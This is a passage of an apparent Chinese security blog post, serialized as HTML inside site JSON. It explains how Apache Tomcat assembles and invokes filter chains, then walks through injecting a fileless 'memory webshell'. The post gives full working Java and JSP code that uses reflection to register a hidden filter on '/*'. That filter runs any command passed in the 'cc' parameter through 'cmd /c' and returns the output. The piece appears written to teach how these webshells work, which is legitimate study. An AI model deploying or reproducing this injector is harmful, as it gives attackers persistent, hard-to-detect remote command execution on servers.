&lt;filter-class&gt;testfilter&lt;/filter-class&gt;</span><br><span class=\"line\">    &lt;/filter&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;filter-mapping&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/filter-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;!--servlet名字，和类名一致--&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--class文件名，如果有包要加上包名--&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;test&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--url--&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后访问一下 <code>/filter</code></p>\n<p>成功触发过滤器</p>\n<h3 id=\"Filter相关类\"><a href=\"#Filter相关类\" class=\"headerlink\" title=\"Filter相关类\"></a>Filter相关类</h3><p>from <a class=\"link\"   href=\"https://paper.seebug.org/1441/#tomcat\" >https://paper.seebug.org/1441/#tomcat<i class=\"fas fa-external-link-alt\"></i></a></p>\n<ul>\n<li><p><strong>Filter</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterDef</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器的配置和描述</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">调用过滤器链</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取过滤器</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterFactory</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">组装过滤器链</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>WebXml</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个存放web.xml中内容的类</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ContextConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个web应用的上下文配置类</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个web应用上下文(Context接口)的标准实现</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardWrapperValve</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"Tomcat-Filter调用流程\"><a href=\"#Tomcat-Filter调用流程\" class=\"headerlink\" title=\"Tomcat Filter调用流程\"></a>Tomcat Filter调用流程</h3><p>首先 <code>ContextConfig$configureContext</code> 对 <code>web.xml</code> 进行解析，获取到 <code>WebXml</code> 实例</p>\n<p>然后直接看到 <code>StandardWrapperValve</code> ，在这里将会完成过滤器的组装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>\n\n<p>看到这行代码，发现 <code>filterchain</code> 是由 <code>ApplicationFilterFactory$createFilterChain</code> 创建的，跟进该方法</p>\n<p>前面的代码主要是初始化 <code>filterchain</code> 变量，这里使用 <code>StandardWrapper$getParent</code> 获取当前 <code>Context</code> 也就是当前运行的WEB应用，然后使用 <code>Context</code> 的 <code>findFilterMaps</code> 获取到 <code>filterMaps</code></p>\n<p><code>filterMaps</code> 中存放了已定义的及自带的 <code>filterMap</code> ，而 <code>filterMap</code> 中存放了 filtername 及 url，然后看看 <code>filter</code> 的组装逻辑</p>\n<p><code>for循环</code> 遍历 <code>filterMaps</code> ，如果当前请求的 <code>url</code> 和 <code>filterMap</code> 中的 <code>urlPatterns</code> 相同，就会调用 <code>findFilterConfig</code> 方法寻找对应 <code>filtername</code> 的 <code>FilterConfig</code> ，如果找到就调用 <code>addFilter</code> 方法将 <code>filterConfig</code> 加入到 <code>filterChain</code></p>\n<p>跟进 <code>addFilter</code> 方法，该方法首先遍历 <code>filterChain</code> ，看看要添加的 <code>filter</code> 是否已经存在。如果存在就直接 <code>return</code></p>\n<p>如果n等于 <code>filters</code> 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 <code>filters</code> 。至此 <code>filterChain</code> 也就组装完成了，接着回到 <code>StandardWrapperValve</code> 执行 <code>ApplicationFilterChain$doFilter</code></p>\n<p>然后跟进 <code>doFilter</code> 方法</p>\n<p>调用了 <code>internalDoFilter</code> 方法</p>\n<p>先获取 <code>filterConfig</code> ，然后通过 <code>filterConfig.getFilter()</code> 获取到 <code>filter</code> ，再调用 <code>filter</code> 的 <code>doFilter</code> 方法，就结束了 Filter 的调用。</p>\n<p>总结一下流程</p>\n<ul>\n<li>先从当前 <code>Context</code> 中获取到 <code>filterMaps</code></li>\n<li>筛选出 <code>urlPattern</code> 与当前请求 url 相符合的 <code>filtername</code></li>\n<li>根据 <code>filtername</code> 找到对应的 <code>FilterConfig</code></li>\n<li>将 <code>FilterConfig</code> 加入到 <code>filterChain</code></li>\n<li>调用 <code>filterChain</code> 的 <code>internalDoFilter</code> 遍历获取 <code>FilterConfig</code></li>\n<li>然后获取 <code>FiletrConfig</code> 对应的 <code>Filter</code> ，并调用 <code>Filter</code> 的 <code>doFilter</code></li>\n</ul>\n<h2 id=\"filter内存马注入\"><a href=\"#filter内存马注入\" class=\"headerlink\" title=\"filter内存马注入\"></a>filter内存马注入</h2><p>理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 <code>filter</code> 注入。</p>\n<p>回想一下 <code>filter</code> 的获取流程，可以发现 <code>filterMaps</code> 是从当前 <code>context</code> 中获取到的</p>\n<p>那如果我们可以对这个 <code>context</code> 中存储的 <code>filterMaps</code> 进行修改是不是就可以注入自己的恶意 <code>filter</code> 了。</p>\n<p>那么怎么修改呢，我们先看一下这个 <code>context</code> ， <code>StandardContext</code> 有三个关于 <code>filter</code> 的成员变量</p>\n<ul>\n<li>filterConfigs：存储 <code>filterConfig</code> 的 <code>HashMap</code> ， <code>filterConfig</code> 中又存储了 <code>FilterDef</code> 和 <code>filter</code> 对象</li>\n<li>filterDefs：存放 <code>FilterDef</code> 的 <code>HashMap</code> ，<strong>FilterDef</strong>中存储着过滤器名，过滤器实例，匹配的url 等</li>\n<li>filterMaps：存放 <code>FilterMap</code> 的 <code>HashMap</code> ， <code>FilterMap</code> 中主要存放了 <code>FilterName</code> 和对应的 <code>URLPattern</code></li>\n</ul>\n<p>注入流程如下</p>\n<ul>\n<li>创建恶意 <code>filter</code></li>\n<li>使用 <code>FilterDef</code> 封装恶意 <code>filter</code></li>\n<li>将该 <code>FilterDef</code> 添加到 <code>FilterDefs</code> 和 <code>FilterConfig</code></li>\n<li>建立恶意 <code>filter</code> 对应的 <code>filterMap</code> ，并将其加入到 <code>filterMaps</code> 中(将其放到最前面)</li>\n</ul>\n<p>大概代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//创建filter</span><br><span class=\"line\">        Filter filter=new Filter() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">                if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                    byte[] bytes = new byte[1024];</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        //封装filter</span><br><span class=\"line\">        String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">        FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(filtername);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        //将filterdef添加到filterdefs中</span><br><span class=\"line\">        standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //将filterdef添加到filterconfig中</span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(true);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //建立对应得filterMap</span><br><span class=\"line\">        FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">        filterMap.setFilterName(filtername);</span><br><span class=\"line\">        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">        //插入filterMaps，将其插到首位</span><br><span class=\"line\">        standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        //添加到filterconfigs</span><br><span class=\"line\">        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">        Configs.setAccessible(true);</span><br><span class=\"line\">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">        filterConfigs.put(filtername,filterConfig);</span><br></pre></td></tr></table></figure>\n\n<p>要想修改这个 <code>context</code> ，就需要先获取到该 <code>context</code>,已知有三种获取方式</p>\n<ul>\n<li><p><strong>将 <code>servletcontext</code> 转换成 <code>StandardContext</code></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong><strong>通过Mbean获取context</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>从线程中获取StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>这里使用第一种方式写一个内存马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //创建filter</span><br><span class=\"line\">    Filter filter=new Filter() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">            HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">            if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                byte[] bytes = new byte[1024];</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //封装filter</span><br><span class=\"line\">    String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">    FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">    filterDef.setFilter(filter);</span><br><span class=\"line\">    filterDef.setFilterName(filtername);</span><br><span class=\"line\">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">    //将filterdef添加到filterdefs中</span><br><span class=\"line\">    standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //将filterdef添加到filterconfig中</span><br><span class=\"line\">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">    constructor.setAccessible(true);</span><br><span class=\"line\">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //建立对应得filterMap</span><br><span class=\"line\">    FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">    filterMap.setFilterName(filtername);</span><br><span class=\"line\">    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class=\"line\">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">    //插入filterMaps，将其插到首位</span><br><span class=\"line\">    standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">    //添加到filterconfigs</span><br><span class=\"line\">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">    Configs.setAccessible(true);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">    filterConfigs.put(filtername,filterConfig);</span><br><span class=\"line\">    out.print(&quot;bingo&quot;);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>不过中文回显还是有点问题</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h2><p>Filter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 <code>web.xml</code>中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。</p>\n<p>从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。</p>\n<h3 id=\"测试demo\"><a href=\"#测试demo\" class=\"headerlink\" title=\"测试demo\"></a>测试demo</h3><p>为了更好的理解Filter，写一个demo</p>\n<p>testfilter.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import javax.servlet.*;</span><br><span class=\"line\">import 